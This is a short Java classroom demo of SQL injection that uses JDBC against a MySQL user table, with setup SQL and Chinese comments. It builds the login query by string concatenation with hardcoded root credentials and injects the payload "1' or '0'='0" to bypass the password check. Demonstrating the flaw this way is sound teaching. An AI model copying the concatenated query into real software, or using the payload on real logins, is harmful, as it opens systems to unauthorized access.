package demo;

import java.sql.*;

/*
SQL注入案例

数据准备
drop table if exists user;
create table user(
	id int PRIMARY KEY auto_increment,
	username varchar(10),
	password varchar(10)
);
insert into user VALUES(null,'zhangsan','123'),(null,'lisi','1234');
*/
public class Demo5_SQL_Injection {
    public static void main(String[] args) throws SQLException {
        Connection conn= DriverManager.getConnection("jdbc:mysql:///db1?useSSL=false","root","123456");
        Statement stmt = conn.createStatement();
        String name="zhangsan",pwd="123";
        System.out.println("此处sql注入即通过修改sql语句，查询表中所有数据，不需要正确的用户名与密码即可登录");
        pwd= "1' or '0'='0";
        ResultSet rs=stmt.executeQuery("select * from user where username='"+name+"' and password ='"+pwd+"'");
        if (rs.next()){
            System.out.println("登录成功");
        }else {
            System.out.println("登陆失败");
        }
        rs.close();
        stmt.close();
        conn.close();
    }
}
